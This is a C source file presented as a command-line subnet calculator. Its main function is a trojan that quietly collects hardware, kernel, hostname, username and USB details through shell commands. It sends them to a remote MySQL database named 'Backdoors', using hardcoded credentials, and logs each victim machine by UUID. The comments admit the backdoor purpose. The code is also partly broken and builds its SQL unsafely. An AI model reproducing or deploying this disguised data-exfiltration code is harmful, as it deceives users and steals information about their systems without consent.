#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <string.h>
#include <mysql.h>
#include <string.h>

void calculatorInterface(); //Call this first
void breakHost(char [16]);
void breakMask(char [16]);

int hostOctets[4];
int maskOctets[4];
char netClass;

int conceptretrieve(){
	struct ifaddrs *ip;
	FILE * proc;
	int c;
	c = getifaddrs(&ip);
	printf("Network address %s : - %d\n",ip->ifa_name,ip->ifa_addr);
	proc = fopen("/proc/cpuinfo","r");
	while(1){
		c = fgetc(proc);
		if( feof(proc) ){
			break;
		}	
		printf("%c",c);
	}
	fclose(proc);

	return 0;
}

int popenretrieve(char temp[], char com[], size_t map){
	size_t n;
	FILE *fp = popen(com, "r");
	if (fp == NULL){ pclose(fp);
	    return -1;}

	while ((n = fread(temp, 1, map-1, fp)) > 0) {
        	temp[n] = '\0';
    	}
	pclose(fp);
	return 1;
}

void breakHost(char address[16])
{
	char *token;

	token = strtok(address, ".");
    int fin1 = 0;
    int length1 = strlen(token);
    for(int i = 0; i < length1; i++)
    {
        fin1 = fin1 * 10 + (token[i] - '0');
    }
    hostOctets[0] = fin1;

    token = strtok(NULL, ".");
    int fin2 = 0;
    int length2 = strlen(token);
    for(int i = 0; i < length2; i++)
    {
        fin2 = fin2 * 10 + (token[i] - '0');
    }
    hostOctets[1] = fin2;

	token = strtok(NULL, ".");
    int fin3 = 0;
    int length3 = strlen(token);
    for(int i = 0; i < length3; i++)
    {
        fin3 = fin3 * 10 + (token[i] - '0');
    }
	hostOctets[2] = fin3;

    token = strtok(NULL, ".");
    int fin4 = 0;
    int length4 = strlen(token);
    for(int i = 0; i < length4; i++)
    {
        fin4 = fin4 * 10 + (token[i] - '0');
    }
    hostOctetshostOctets[3] = fin4;
}

void breakMask(char address[16])
{
	char *token;

	token = strtok(address, ".");
    int fin1 = 0;
    int length1 = strlen(token);
    for(int i = 0; i < length1; i++)
    {
        fin1 = fin1 * 10 + (token[i] - '0');
    }
    maskOctets[0] = fin1;

    token = strtok(NULL, ".");
    int fin2 = 0;
    int length2 = strlen(token);
    for(int i = 0; i < length2; i++)
    {
        fin2 = fin2 * 10 + (token[i] - '0');
    }
    maskOctets[1] = fin2;

	token = strtok(NULL, ".");
    int fin3 = 0;
    int length3 = strlen(token);
    for(int i = 0; i < length3; i++)
    {
        fin3 = fin3 * 10 + (token[i] - '0');
    }
	maskOctets[2] = fin3;

    token = strtok(NULL, ".");
    int fin4 = 0;
    int length4 = strlen(token);
    for(int i = 0; i < length4; i++)
    {
        fin4 = fin4 * 10 + (token[i] - '0');
    }
    maskOctets[3] = fin4;
}

void calculatorInterface() /* GTK is a bit of a nightmare; CLI UIs all the way, baby! */
{
    printf("
	Welcome to the Subnet Calculator!\n
	This program allows network administrators to determine many things involved with subnetting:\n
	 ~Determines how many hosts a subnet can use.\n
	 ~Determines what the max and min value an address can be in a subnet.\n
	 ~Determines what address broadcasts to every host in the subnet.\n
	 ~Determines what default gateway a host should use in this subnet.\n
	 ~Determines what subnet ID a host should use in this subnet.\n
	\n \n
	This program will walk you through the steps to use this calculator.\n
	In order to make full use of this program, you will need/input:
	 ~A host address\n
	  - an IP address; an existing host that will build the rest of the data
	 ~A major network class\n
	  - either A, B, or C; determines the address space an ISP has granted\n
	 ~A subnet mask for the desired subnet\n
	  - should be similar to an IP address with only the following possible values: { 0 128 192 224 240 248 252 255 };\n
	    determines how the network has been split into subnets.\n
	\n \n
	");

	char choice1[16];
	char choice2;
	char choice3[16];
	
	while(1==1)
	{
		printf("Please input the host address: ");
		scanf("%s", choice1);
		printf();
		breakHost(choice1); //Break up the IP into four integers, one per octet
		if(hostOctets[0] < 1 || hostOctets[1] < 0 || hostOctets[2] < 0 || hostOctets[3] < 1 || hostOctets[0] > 254 || hostOctets[1] > 255 || hostOctets[2] > 255 || hostOctets[3] > 254)
		{
			printf("\n ###Please input a valid option### \n");
		}
		else
		{
			break;
		}
	}

	while(1==1)
	{
		printf("Please input the network class: ");
		scanf("%c", choice2);
		printf();
		if(choice2 == 'A' || choice2 == 'a' || choice2 == 'B' || choice2 == 'b' || choice2 == 'C' || choice2 == 'c')
		{
			netClass = choice2;
			break;
		}
		else
		{
			printf("\n ###Please input a valid option### \n");
		}
	}

	while(1==1)
	{
		printf("Please input the subnet mask: ");
		scanf("%s", choice3);
		printf();
		breakMask(choice3); //Break up the IP into four integers, one per octet
		if(maskOctets[0] == 0 || maskOctets[0] == 128 || maskOctets[0] == 192 || maskOctets[0] == 224 || maskOctets[0] == 240 || maskOctets[0] == 248 || maskOctets[0] == 252 || maskOctets[0] == 255)
		{
			if(maskOctets[1] == 0 || maskOctets[1] == 128 || maskOctets[1] == 192 || maskOctets[1] == 224 || maskOctets[1] == 240 || maskOctets[1] == 248 || maskOctets[1] == 252 || maskOctets[1] == 255)
			{
				if(maskOctets[2] == 0 || maskOctets[2] == 128 || maskOctets[2] == 192 || maskOctets[2] == 224 || maskOctets[2] == 240 || maskOctets[2] == 248 || maskOctets[2] == 252 || maskOctets[2] == 255)
				{
					if(maskOctets[3] == 0 || maskOctets[3] == 128 || maskOctets[3] == 192 || maskOctets[3] == 224 || maskOctets[3] == 240 || maskOctets[3] == 248 || maskOctets[3] == 252)
					{
						break;
					}
				}
			}
		}
		else
		{
			printf("\n ###Please input a valid option### \n");
		}
	}

	printf("
	Thank you for your entries!\n
	Please wait just a moment while we calculate your results.\n
	");
	
	for(int i = 0; i > 10000; i++); //wait some time (so the backdoor has more time)

	/*
	Call subnetCalculator and use the global variables
	*/

    /*
	OPTIONAL:
	Print the results
	(probably included in the subnetCalculator function, but cn be beautified)
	*/

}

int subnetCalculator(){ // Not fully implemented -- just conceptual -- Will likely split into multiplefunctions
	/* OCT variable for each octet x.x.x.x and CIDR for mask */
	int OCT0, OCT1, OCT2, OCT3, CIDR, numOfSubnets, numOfHosts; 
	/* Finding IP class */
	char class;	

	/* Conditional statement to remove invalid IP addresses */
	if( ((OCT0 < 0) || (OCT1 < 0) || (OCT2 < 0) || (OCT3 < 0)) || 
	((OCT0 > 255) || (OCT1 > 255) || (OCT2 > 255) || (OCT3 > 255)) || 
	((OCT0 == 127)) || 
	((OCT0 == 0) && (OCT1 == 0) && (OCT2 == 0) && (OCT3 == 0)) ){
		
		return -1; // Conceptual; requery user for a correct IP
	}

	/* Conditional statement to remove invalid CIDR */
	if(CIDR > 32 || CIDR < 0){
		return -1; // Conceptual; requery user for a correct CIDR
	}
	
	/* Conditional statement to assign IP class */
	if(OCT0 <=127){ // Assigning Class
		class = 'A';
		if(CIDR>=8){
			numOfSubnets = pow(2,CIDR-8);
		} else{
			numOfSubnets = pow(2,8-CIDR);
		}
		numOfHosts = pow(2,32-CIDR)-2;
	}else if (OCT0 <=192){
		class = 'B';
		if(CIDR>=16){
			numOfSubnets = pow(2,CIDR-16);
		} else{
			numOfSubnets = pow(2,18-CIDR);
		}
		numOfHosts = pow(2,32-CIDR)-2;
	} else{
		class = 'C';
		if(CIDR>=16){numOfSubnets = pow(2,CIDR-16);}
		else{numOfSubnets = pow(2,18-CIDR);}
		numOfHosts = pow(2,32-CIDR)-2;
	}
	
	
}


int main()
{
//Defining Device Extraction variables.  Accounted for End-of-String character.  Char length matches max length defined in the database
	char UUID[51] = "8284246F-05X13-1945-90DD-DD6D00E95954";
	char lshw[13001] = "";
	popenretrieve(lshw, "lshw", sizeof(lshw));
	//printf("%s",lshw);	
	char lscpu[1601] = "";
	popenretrieve(lscpu, "lscpu", sizeof(lscpu));
	//printf("%s",lscpu);
	char lsblk[3001] = "";
	popenretrieve(lsblk, "lsblk", sizeof(lsblk));
	//printf("%s",lsblk);
	char datetime[24] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
	popenretrieve(datetime, "date +'%F %T'", sizeof(datetime));
	//printf("%s",datetime);
	
	//Defining RunLog Extraction variables
	char KernelVer[51] = "";
	popenretrieve(KernelVer, "uname -v", sizeof(KernelVer));
	//printf("%s",KernelVer);
	char Hostname[256] = "";
	popenretrieve(Hostname, "hostname", sizeof(Hostname));
	//printf("%s",Hostname);
	char Username[33] = "";
	popenretrieve(Username, "whoami", sizeof(Username));
	//printf("%s",Username);
	char KernelRelease[21] = "";
	popenretrieve(KernelRelease, "uname -r", sizeof(KernelRelease));
	//printf("%s",KernelRelease);
	char TimeRun[20] = "";		//Format: 'YYYY-MM-DD hh:mm:ss'
	char lsusb[101] = "";
	popenretrieve(lsusb, "lsusb", sizeof(lsusb));
	//printf("%s",lsusb);
	char LocalIP[16] = "";
	char ExternalIP[16] = "";
	char GatewayIP[16] = "";
	char NewLocalUser[2] = "";
	char SSHserver[2] = "";
	char NewSSHuser[2] = "";

	//Defining Database variables
	MYSQL *conn;
	conn = mysql_init(NULL);
	MYSQL_RES *res;
	MYSQL_ROW row;
	char *server = "mysqldatabase.cvnrdza49fyl.us-east-2.rds.amazonaws.com";
	char *user = "Farrington";
	char *password = "ClaySiltSand";
	char *database = "Backdoors";
	char prepairedStatement [16600] = "";
 
	//Making the connection to the database
	if (!mysql_real_connect(conn, server, user, password, database, 0, NULL, 0))
	{
	 	printf("Connection Failed... Error: %s\n", mysql_error(conn));
		return 0;
	}
 	else
 	{
 		printf("Connection Sucessful\n");
	} 	

 	//Finding if this is the first time the Trojan ran on this machine
 	mysql_query(conn, "SELECT UUID FROM Device");
 	res = mysql_use_result(conn);
 	char UUIDs[51];	//temp for checking UUID values
 	int duplicate = 0;	//1 = duplicate
 	while ((row = mysql_fetch_row(res)) != NULL)
	{
		strncpy(UUIDs, row[0], 50);
		if(strncmp(UUIDs, UUID, 50) == 0)
		{
			printf("COPY DETECTED\n");
			duplicate = 1;
		}	
		//printf("%s \n", UUIDs);
	}
	
	//If this is the first time this PC ran this trojan, log Device info
	if (duplicate == 0)
	{
		//Creating the prepaired statement
		sprintf(prepairedStatement, "INSERT INTO Device VALUES ('%s','%s','%s','%s','%s')", UUID, lshw, lscpu, lsblk, datetime);
		//printf("%s", prepairedStatement);
		
		//Runs the INSERT query to Device Table
		if(mysql_query(conn, prepairedStatement) != 0)
		{
			printf("Query Failed.  Error: %s\n", mysql_error(conn));
		}
	}
	
	//RunLog INSERT
	sprintf(prepairedStatement, "INSERT INTO RunLog VALUES (0,'%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s','%s')", UUID,KernelVer,Hostname,Username,KernelRelease,TimeRun,lsusb,LocalIP,ExternalIP,GatewayIP,NewLocalUser,SSHserver,NewSSHuser);

	//Runs the INSERT query to RunLog Table
	if(mysql_query(conn, prepairedStatement) != 0)
	{
		printf("Query Failed.  Error: %s\n", mysql_error(conn));
	}


	int i = conceptretrieve();

 
}


